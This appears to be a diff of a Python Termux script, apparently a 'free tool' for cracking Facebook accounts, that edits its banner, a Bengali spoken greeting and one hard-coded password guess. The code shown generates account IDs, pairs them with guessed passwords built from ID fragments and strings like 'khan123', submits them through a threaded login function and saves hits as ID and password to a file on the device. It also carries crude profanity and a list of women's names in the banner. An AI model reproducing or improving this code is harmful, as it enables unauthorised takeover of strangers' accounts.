@@ -25,7 +25,7 @@ fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'co
 #------------------[ INSTALL ]-----------------#
 os.system('pkg install sox -y')
 os.system('pkg install espeak')
-os.system('clear');os.system('espeak -a 300 "ওকে,come to,Rahim King Use Fucking free tool"')
+os.system('clear');os.system('espeak -a 300 "ওকে,কিং চোদাবক্স টুল ব্যবহার করার জন্য আপনাকে ধন্যবাদ"')
 #------------------[ DATE ]-----------------#
 dateti = str(datetime.now()).split(' ')[0]
 #------------------[ PROXY ]-----------------#
@@ -134,12 +134,12 @@ logo = f'''\r\r\x1b[0;92m
 ║\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m\x1b[10;91m<•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[0;92m\x1b[10;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;33m 
-\x1b[10;93m╠══[SEND BY                    • \x1b[1;38mAR RAHIM KING ║ 
-\x1b[10;91m╠══[TELIGERM                  • king fuck Family ║    
-\x1b[10;92m╠══[Github                   • AR Rahim-King ]  ║   
-\x1b[10;94m╠══[All X GF                  •Rotna,Bithi,Sadia,💕 ║ 
-\x1b[10;95m╠══[TOOLS                    • FREE ] ║    
-\x1b[10;93m╠══[VERSION                  • 11.2.1 ]          ║ \x1b[10;92m
+\x1b[10;93m╠══[SEND BY              • \x1b[1;38mAR RAHIM KING ║ 
+\x1b[10;91m╠══[TELIGERM             • king fuck Family ║    
+\x1b[10;92m╠══[Github               • AR Rahim-King    ║   
+\x1b[10;94m╠══[All X GF             •Rotna,Bithi,Sadia,💕
+\x1b[10;95m╠══[TOOLS                • FREE ] ║    
+\x1b[10;93m╠══[VERSION              • 11.2.1 ]       ║ \x1b[10;92m
 \x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\x1b[1;31m'''
 #------------------[ NAME ]-----------------#
 #------------------[ MENU ]-----------------#
@@ -185,7 +185,7 @@ def rmenu1():
             id = code + rngx
             if '1' in rcd:psd = [id,rngx,id[:6],id[:7],id[:8],id[5:]]
             if '2' in rcd:psd = [id,rngx,id[5:],'khan123']
-            if '3' in rcd:psd = [id,rngx,id[:6],'57273200']
+            if '3' in rcd:psd = [id,rngx,id[:6],'57273300']
             tonxoys.submit(graphrm, id, psd, tid)
 #------------------[ METHOD-1 ]-----------------#
 def graphrm(id,psd,tid):
@@ -220,7 +220,7 @@ def graphrm(id,psd,tid):
             if twfx in str(lo):
                 iid = lo['error']['error_data']['uid']
                 print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;96m[Rahim-] {iid} | {psw}{W}''')
-                os.system('espeak -a 300 \"Rahim\"')
+                os.system('espeak -a 300 \"Rahim ok\"')
                 open('/sdcard/Rahim.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
                 twf.append(id)
                 break
